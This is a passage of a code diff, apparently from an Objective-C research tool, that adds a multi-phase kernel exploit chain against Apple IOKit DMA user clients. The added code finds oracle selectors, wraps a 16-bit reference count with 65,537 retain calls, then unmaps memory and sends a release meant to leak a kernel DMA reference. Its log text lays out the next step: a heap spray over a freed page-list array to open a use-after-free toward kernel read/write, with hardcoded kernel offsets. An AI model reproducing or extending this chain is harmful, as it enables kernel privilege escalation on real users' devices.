+            if (kr == KERN_SUCCESS && outsz >= 0x10) {
+                oracles[oi].s_remap = p101_gate_w(outb, outsz);
+            } else {
+                oracles[oi].alive = 0;
+                L([NSString stringWithFormat:@"    ORACLE-REMAP %@ sel=%u FAILED kr=0x%x",
+                   connOf(oracles[oi].conn), oracles[oi].sel, kr]);
+                continue;
+            }
+        }
+    } else {
+        L(@"[!] no window — correlation UNAVAILABLE. Oracle census only.");
+        for (unsigned ci = 0; ci < nConn; ci++) {
+            for (uint32_t sel = 0; sel < P101_ORACLE_SELS; sel++) {
+                uint8_t outb[P101_OUT_SZ];
+                size_t outsz = sizeof(outb);
+                kern_return_t kr = gateRead(conns[ci], sel, outb, &outsz);
+                if (kr != KERN_SUCCESS) continue;
+                if (outsz < 0x10) continue;
+                uint32_t w = p101_gate_w(outb, outsz);
+                L([NSString stringWithFormat:@"    ORACLE-BASE %s sel=%u out+0xc=0x%08x",
+                   connWho[ci], sel, w]);
+                if (nOracle < P101_MAX_ORACLES) {
+                    oracles[nOracle].conn = conns[ci];
+                    oracles[nOracle].sel = sel;
+                    oracles[nOracle].s_map = w;
+                    oracles[nOracle].s_unmap = 0xffffffffu;
+                    oracles[nOracle].s_remap = 0xffffffffu;
+                    oracles[nOracle].corroborated = 0;
+                    oracles[nOracle].alive = 1;
+                    nOracle++;
                 }
-                if (strstr(cls, "DMA") || strstr(cls, "DART") || strstr(cls, "AES") ||
-                    strstr(cls, "dma") || strstr(cls, "dart")) {
-                    for (uint32_t ty = 0; ty < 2 && !fired; ty++) {
-                        io_connect_t c = 0;
-                        kern_return_t okr = IOServiceOpen(svc, mach_task_self(), ty, &c);
-                        if (okr != KERN_SUCCESS || !c) continue;
-                        char who[96];
-                        snprintf(who, sizeof(who), "%s/t%u", cls, ty);
-                        sweep_conn(c, who);
-                        IOServiceClose(c);
-                        opened++;
+            }
+        }
+    }
+    __block unsigned nCorro = 0;
+    for (unsigned oi = 0; oi < nOracle; oi++) {
+        if (oracles[oi].s_unmap != oracles[oi].s_map ||
+            oracles[oi].s_remap != oracles[oi].s_unmap) {
+            oracles[oi].corroborated = 1;
+            nCorro++;
+        }
+        L([NSString stringWithFormat:@"    ORACLE %@ sel=%u map=0x%x unmap=0x%x remap=0x%x %s",
+           connOf(oracles[oi].conn), oracles[oi].sel, oracles[oi].s_map,
+           oracles[oi].s_unmap, oracles[oi].s_remap,
+           oracles[oi].corroborated ? "CORROBORATED" : ""]);
+    }
+    L([NSString stringWithFormat:@"[*] oracle census %u candidates, %u corroborated", nOracle, nCorro]);
+    SYNC();
+
+    /* ---------- lane pick (v1 machinery, bounded) ------------------------ */
+    L(@"--- LANE PICK (v1 shape, one pass) ---");
+    for (unsigned ci = 0; ci < nConn && acquireConn == 0; ci++) {
+        for (uint32_t sel = 0; sel < P101_ORACLE_SELS && acquireConn == 0; sel++) {
+            kern_return_t kr = tryShape(conns[ci], connWho[ci], sel, va, len, 0, NULL, P101_OUT_SZ);
+            if (kr != KERN_SUCCESS) continue;
+            /* reuse: same addr+len = the 43684 increment path */
+            uint8_t outb[P101_OUT_SZ];
+            size_t outsz = sizeof(outb);
+            uint64_t scOut[4] = {0};
+            uint32_t scOutCnt = 4;
+            uint8_t in[24];
+            memset(in, 0, sizeof(in));
+            memcpy(in, &va, 8);
+            memcpy(in + 8, &len, 8);
+            uint32_t p4 = 0, p5 = 0;
+            memcpy(in + 16, &p4, 4);
+            memcpy(in + 20, &p5, 4);
+            kern_return_t krx = IOConnectCallMethod(conns[ci], sel, NULL, 0, in, 24,
+                                                    scOut, &scOutCnt, outb, &outsz);
+            L([NSString stringWithFormat:@"    REUSE %s sel=%u kr=0x%x (acquire lane test)", connWho[ci], sel, krx]);
+            if (krx == KERN_SUCCESS) {
+                acquireConn = conns[ci];
+                acquireSel = sel;
+            }
+        }
+    }
+    if (acquireConn) {
+        L([NSString stringWithFormat:@"[*] ACQUIRE LANE %@ sel=%u", connOf(acquireConn), acquireSel]);
+    } else {
+        L(@"[-] NO LANE — no UC selector accepted the acquire shape (v1 P086 hold). Phases 2-3 SKIP.");
+    }
+    SYNC();
+
+    /* ---------- PHASE 2 — RETAIN-WRAP ------------------------------------- */
+    unsigned long retains = 0;
+    int wrapped = 0;
+    kern_return_t lastWrapKr = 0;
+    if (acquireConn) {
+        L(@"--- PHASE 2 RETAIN-WRAP (65,537 retains, 4096/round, abort on first non-SUCCESS) ---");
+        t0 = mach_absolute_time();
+        wrapped = 1;
+        for (unsigned r = 0; r < P101_ROUNDS && wrapped; r++) {
+            uint8_t in[24];
+            memset(in, 0, sizeof(in));
+            memcpy(in, &va, 8);
+            memcpy(in + 8, &len, 8);
+            uint32_t p4 = 0, p5 = 0;
+            memcpy(in + 16, &p4, 4);
+            memcpy(in + 20, &p5, 4);
+            for (uint32_t i = 0; i < P101_BATCH; i++) {
+                uint8_t outb[P101_OUT_SZ];
+                size_t outsz = sizeof(outb);
+                uint64_t scOut[4] = {0};
+                uint32_t scOutCnt = 4;
+                kern_return_t kr = IOConnectCallMethod(acquireConn, acquireSel, NULL, 0, in, 24,
+                                                       scOut, &scOutCnt, outb, &outsz);
+                lastWrapKr = kr;
+                if (kr != KERN_SUCCESS) {
+                    L([NSString stringWithFormat:@"[-] ABORT round %u iter %u kr=0x%x", r, i, kr]);
+                    wrapped = 0;
+                    break;
+                }
+                retains++;
+            }
+            L([NSString stringWithFormat:@"    WRAP round %u retains=%lu kr=0x%x elapsed=%.1fs",
+               r, retains, lastWrapKr, (mach_absolute_time() - t0) * 1e-9]);
+            /* oracle resample per round (progress watch, not a verdict) */
+            for (unsigned oi = 0; oi < nOracle; oi++) {
+                if (!oracles[oi].alive) continue;
+                uint8_t outb[P101_OUT_SZ];
+                size_t outsz = sizeof(outb);
+                kern_return_t kr = gateRead(oracles[oi].conn, oracles[oi].sel, outb, &outsz);
+                if (kr == KERN_SUCCESS && outsz >= 0x10) {
+                    uint32_t w = p101_gate_w(outb, outsz);
+                    if (w != oracles[oi].s_remap) {
+                        L([NSString stringWithFormat:@"      oracle[%@ sel=%u] moved 0x%x -> 0x%x",
+                           connOf(oracles[oi].conn), oracles[oi].sel, oracles[oi].s_remap, w]);
+                        oracles[oi].s_remap = w;
+                        oracles[oi].corroborated = 1;
+                        nCorro++;
+                    }
+                } else {
+                    oracles[oi].alive = 0;
+                    L([NSString stringWithFormat:@"      oracle[%@ sel=%u] died kr=0x%x",
+                       connOf(oracles[oi].conn), oracles[oi].sel, kr]);
+                }
+            }
+            SYNC();
+        }
+        if (wrapped && retains == (unsigned long)P101_WARP_TARGET - 1) {
+            /* one MORE retain: the wrap-through is invisible (post-add check is
+               on the OLD value); the NEXT one takes the first-ref arm and
+               re-acquires the sharing ctx = the ctx-ref leak marker. */
+            uint8_t in[24];
+            memset(in, 0, sizeof(in));
+            memcpy(in, &va, 8);
+            memcpy(in + 8, &len, 8);
+            uint32_t p4 = 0, p5 = 0;
+            memcpy(in + 16, &p4, 4);
+            memcpy(in + 20, &p5, 4);
+            uint8_t outb[P101_OUT_SZ];
+            size_t outsz = sizeof(outb);
+            uint64_t scOut[4] = {0};
+            uint32_t scOutCnt = 4;
+            kern_return_t kr = IOConnectCallMethod(acquireConn, acquireSel, NULL, 0, in, 24,
+                                                   scOut, &scOutCnt, outb, &outsz);
+            L([NSString stringWithFormat:@"    FIRST-REF-ARM retain kr=0x%x (ctx re-arm if the law held)", kr]);
+            retains++;
+        }
+        L([NSString stringWithFormat:@"[*] RETAIN-WRAP total=%lu %s (theory: u16 at md+0x34 wrapped; no ceiling per law)",
+           retains, wrapped ? "COMPLETED" : "ABORTED"]);
+    } else {
+        L(@"--- PHASE 2 RETAIN-WRAP SKIPPED (no lane) ---");
+    }
+    SYNC();
+
+    /* ---------- PHASE 3 — UNMAP-ARM + RELEASE-SKIP ------------------------ */
+    int skipEstablished = 0;
+    if (acquireConn || nCorro) {
+        L(@"--- PHASE 3 UNMAP-ARM + RELEASE-SKIP ---");
+        if (!nCorro) {
+            L(@"[!] GUARD: no corroborated oracle — the gated-vs-panic dispatcher");
+            L(@"    route is UNPROVEN from user space (twin 0xa511324 PANICS on");
+            L(@"    underflow). Honest SKIP — do not send a release on a guess.");
+        } else if (!mapped) {
+            L(@"[!] window unmapped — release SKIPPED (no armed +0x98 to verify).");
+        } else {
+            unsigned oi;
+            for (oi = 0; oi < nOracle; oi++) if (oracles[oi].corroborated && oracles[oi].alive) break;
+            if (oi == nOracle) {
+                L(@"[!] corroborated oracle lost during wrap — release SKIPPED (honest).");
+            } else {
+                L([NSString stringWithFormat:@"[*] pre-release oracle %@ sel=%u =0x%x (expect %u pages)",
+                   connOf(oracles[oi].conn), oracles[oi].sel, oracles[oi].s_remap, P101_SURF_PAGES]);
+                kern_return_t dkr = mach_vm_deallocate(mach_task_self(), mapped, (mach_vm_size_t)P101_SURF_LEN);
+                if (dkr == KERN_SUCCESS) mapped = 0;
+                L([NSString stringWithFormat:@"[*] UNMAP-ARM kr=0x%x (worker 0xa5073c4 resets +0x98 to 0)", (unsigned)dkr]);
+                uint8_t outb[P101_OUT_SZ];
+                size_t outsz = sizeof(outb);
+                kern_return_t kr = gateRead(oracles[oi].conn, oracles[oi].sel, outb, &outsz);
+                uint32_t wPost = 0xffffffffu;
+                if (kr == KERN_SUCCESS && outsz >= 0x10) {
+                    wPost = p101_gate_w(outb, outsz);
+                    oracles[oi].s_unmap = wPost;
+                } else {
+                    oracles[oi].alive = 0;
+                    L([NSString stringWithFormat:@"[-] post-arm oracle %@ sel=%u FAILED kr=0x%x",
+                       connOf(oracles[oi].conn), oracles[oi].sel, kr]);
+                }
+                L([NSString stringWithFormat:@"[*] post-arm oracle = 0x%x (expect 0)", wPost]);
+                if (wPost == 0xffffffffu || wPost != 0) {
+                    L(@"[!] +0x98 did NOT read 0 — gate state unconfirmed. Release NOT sent (honest SKIP).");
+                } else {
+                    L([NSString stringWithFormat:@"[*] GATE ARMED (+0x98==0). RELEASE-ATTEMPT on op-6 route via %@ sel=%u",
+                       connOf(oracles[oi].conn), oracles[oi].sel]);
+                    /* release routed to the GATED dispatcher (0xa515d60 class):
+                       struct-method on the SAME connection's corroborated oracle
+                       selector (the sel whose kernel case-6 reads [x0+0x98]).
+                       NOT the teardown-shaped p4=1 route (op-6, case-5 = the
+                       sel-6 of the dispatcher — the v1 teardown shape). */
+                    uint32_t relSel = oracles[oi].sel;
+                    io_connect_t relConn = oracles[oi].conn;
+                    uint8_t inb[P101_IN_SZ];
+                    memset(inb, 0, sizeof(inb));
+                    outsz = sizeof(outb);
+                    kern_return_t rkr = csm ? csm((mach_port_t)relConn, relSel, inb, sizeof(inb), outb, &outsz)
+                                            : 0xe00002c2;
+                    L([NSString stringWithFormat:@"[*] RELEASE-ATTEMPT %@ sel=%u kr=0x%x",
+                       connOf(relConn), relSel, rkr]);
+                    /* SKIP verdict: oracle still readable + a subsequent op */
+                    uint32_t wAfter = 0xffffffffu;
+                    outsz = sizeof(outb);
+                    kern_return_t vkr = gateRead(oracles[oi].conn, oracles[oi].sel, outb, &outsz);
+                    if (vkr == KERN_SUCCESS && outsz >= 0x10) wAfter = p101_gate_w(outb, outsz);
+                    L([NSString stringWithFormat:@"[*] post-release oracle = 0x%x (still readable = no teardown)", wAfter]);
+                    if (rkr == KERN_SUCCESS && wAfter != 0xffffffffu) {
+                        kern_return_t okr = tryShape(relConn, "POST-RELEASE-OP", relSel, va, len, 0,
+                                                     NULL, P101_OUT_SZ);
+                        if (okr == KERN_SUCCESS) {
+                            L(@"[+] RELEASE-SKIP VERIFIED: release returned SUCCESS with [x0+0x98]==0,");
+                            L(@"    object did NOT teardown (oracle read post + a subsequent op ran) =");
+                            L(@"    the 0xa515f88 gate held and a kernel dmaref LEAKED on this object.");
+                            skipEstablished = 1;
+                        } else {
+                            L(@"[-] release SKIPPED but post-op FAILED — teardown possible; NOT a skip verdict (honest).");
+                        }
+                    } else {
+                        L(@"[-] release kr or oracle post-read contradicts skip — NO skip verdict (honest).");
                     }
                 }
-                IOObjectRelease(svc);
             }
-            L([NSString stringWithFormat:@"[*] dynamic pass: %u engine UCs swept%s",
-               opened, fired ? " (fingerprint landed)" : ""]);
-            IOObjectRelease(it);
         }
+    } else {
+        L(@"--- PHASE 3 SKIPPED (no lane, no oracle) ---");
     }
+    SYNC();
 
-    if (mapped) mach_vm_deallocate(mach_task_self(), mapped, asz ? asz : P101_LEN);
+    /* ---------- cleanup --------------------------------------------------- */
+    if (mapped) mach_vm_deallocate(mach_task_self(), mapped, (mach_vm_size_t)P101_SURF_LEN);
     if (mdport) mach_port_deallocate(mach_task_self(), mdport);
+    for (unsigned ci = 0; ci < nConn; ci++) IOServiceClose(conns[ci]);
+    if (dev && pDevRelease) pDevRelease(dev);
     if (surf) CFRelease(surf);
     CFRelease(dict);
     CFRelease(nSz);
-    CFRelease(nMode);
 
-    L(@"=== VERDICT ===");
-    L([NSString stringWithFormat:@"[*] fp=%u setups=%u reuses=%u teardowns=%u fired=%u",
-       fp, setups, reuses, teardowns, fired]);
-    if (fp && fired) {
-        L(@"[+] P101 FP IDENTIFIED — dmaCommandOperation consumer found (see FP line above). 43684 path candidate.");
-    } else if (setups > 0) {
-        L(@"[*] P101 REACHED, no fingerprint — UC selectors accept the shape but none answer the");
-        L(@"    43684 codes; sel census recorded. Plain-SUCCESS no longer counts as 'FIRED' (v2 lesson).");
-    } else
-        L(@"[-] P101 NONE — no fingerprint/success. P086 shape holds: dmaCommandOperation UC walk-up still open.");
+    /* ---------- PHASE 4 — VERDICT ------------------------------------------ */
+    L(@"=== VERDICT (p101-iomd-chain-v2) ===");
+    L([NSString stringWithFormat:@"[*] chain: lane %@ / oracle %s / retain-wrapped %s:",
+       acquireConn ? @"Y" : @"N",
+       nCorro ? @"CORROBORATED" : @"UNPROVEN",
+       wrapped ? @"Y" : @"N"]);
+    L([NSString stringWithFormat:@"[*] retains issued=%lu (u16 wrap theory). oracle candidates=%u corroborated=%u",
+       retains, nOracle, nCorro]);
+    if (skipEstablished) {
+        L(@"[+] RELEASE-SKIP landed — one dmaref leaked on the armed object.");
+        L(@"    THE +0x34 WRAP AND THE SKIP ARE STILL LEAD-QUALITY ONLY: no");
+        L(@"    direct u16 read (that needs KRW), the u16 wrap is inferred, and");
+        L(@"    the UAF / ioGMD page-list confusion was NOT attempted here.");
+        L(@"    PERMA-ALIVE OBJECT + STALE PAGE-LIST = the evidence this tap");
+        L(@"    leaves. No kread, no KRW, hasKread unchanged.");
+    } else if (nCorro && acquireConn) {
+        L(@"[!] chain: wrap issued + oracle live; release step DID NOT verify a SKIP (honest).");
+    } else {
+        L(@"[-] chain: NO corroborated oracle and/or NO acquire lane. 43684 UC");
+        L(@"    walk-up still open (P086 hold). Nothing leaked, nothing freed.");
+    }
+    L(@"--- NEXT DESIGN (the page-list confusion shape, for the ledger) ---");
+    L(@"  the ioGMD page-list array: 16B/entry, kalloc bl 0x9e18728 at");
+    L(@"  0xa5081ec, u32 entry count at sub+0xe8, freepool head 0xa903db0.");
+    L(@"  After a verified release-skip, the object stays alive with a stale");
+    L(@"  [sub+0xe0] page list + [sub+0xe8] count; the confusion round sprays");
+    L(@"  a controlled kalloc bucket over the freed array, then drives the");
+    L(@"  still-alive IOMD deref = the UAF window. The count field is what");
+    L(@"  the reset does NOT clear when the gate fires first.");
+    L(@"  Route guard carries: twin 0xa511324 dec PANICS — the release must");
+    L(@"  only go through a corroborated 0xa515d60 wrapper, never on a guess.");
     L([NSString stringWithFormat:@"[*] hasKread=%@ unchanged. Titan write is P102. T7 stays reach-only.",
        [P007Board shared].hasKread ? @"YES" : @"NO"]);
 
-    [[P007Board shared] recordEvent:@"p101_dma_fire"
+    [[P007Board shared] recordEvent:@"p101_iomd_chain"
                                  kind:@"fire"
-                               detail:[NSString stringWithFormat:@"fired=%u fp=%u reuse=%u", fired, fp, reuses]
+                               detail:[NSString stringWithFormat:@"retains=%lu corro=%u skip=%d lane=%d",
+                                       retains, nCorro, skipEstablished, acquireConn != 0]
                                source:P101_TAG];
-    if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
+    SYNC();
+    if (fd >= 0) close(fd);
     return log;
 }
 
